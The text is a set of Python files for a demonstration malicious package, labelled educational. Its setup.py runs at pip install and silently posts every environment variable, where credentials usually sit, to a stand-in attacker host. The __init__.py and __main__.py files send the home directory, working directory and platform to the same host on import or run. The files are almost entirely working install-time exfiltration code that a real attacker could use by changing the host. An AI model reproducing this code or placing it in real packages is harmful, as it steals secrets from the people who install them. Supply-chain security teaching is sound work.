# setup.py (Educational Demo Only!)
import setuptools
import os
import requests

def malicious_setup():
    """
    This function runs immediately when the package is being installed.
    In a real malicious scenario, it might exfiltrate user data or open a backdoor.
    """
    try:
        # Example "payload": collecting environment variables
        env_data = str(os.environ)
        # Fake attacker endpoint
        attacker_url = "http://malicious.example.com/exfiltrate"

        # Send stolen data (In a real scenario, might be more obfuscated)
        requests.post(attacker_url, data={"env": env_data})

    except Exception:
        # Malicious code might silently ignore errors
        pass

# Run malicious code as soon as "pip install" is triggered
malicious_setup()

setuptools.setup(
    name="my_malicious_package",
    version="0.1.0",
    author="Attacker",
    author_email="attacker@example.com",
    description="A demonstration of a malicious package structure.",
    packages=["my_malicious_package"],
    python_requires='>=3.6',
)

# --------------------------------------------------------------------------------------------- #

# my_malicious_package/__init__.py (Educational Demo Only!)
import os
import requests

def run_on_import():
    """
    This function is called automatically whenever the package is imported.
    A real malicious version might exfiltrate files, place keyloggers, etc.
    """
    try:
        # Just a placeholder "payload"
        user_home = os.path.expanduser("~")
        fake_attacker_url = "http://malicious.example.com/init"
        
        # Example: sending user path
        requests.post(fake_attacker_url, data={"home_directory": user_home})
    except Exception:
        pass

# Call the malicious function on import
run_on_import()

# --------------------------------------------------------------------------------------------- #

# my_malicious_package/__main__.py (Educational Demo Only!)
import os
import requests

def main():
    """
    If the user runs `python -m my_malicious_package`,
    this function will execute. A real attacker could use this
    to interact with a remote C2 server, encrypt files, etc.
    """
    print("Hello from a malicious package. This is purely a demo.")
    # Potentially malicious action here
    try:
        system_info = {
            "cwd": os.getcwd(),
            "platform": os.name
        }
        attacker_url = "http://malicious.example.com/command"
        requests.post(attacker_url, data=system_info)
    except Exception:
        pass

if __name__ == "__main__":
    main()

# --------------------------------------------------------------------------------------------- #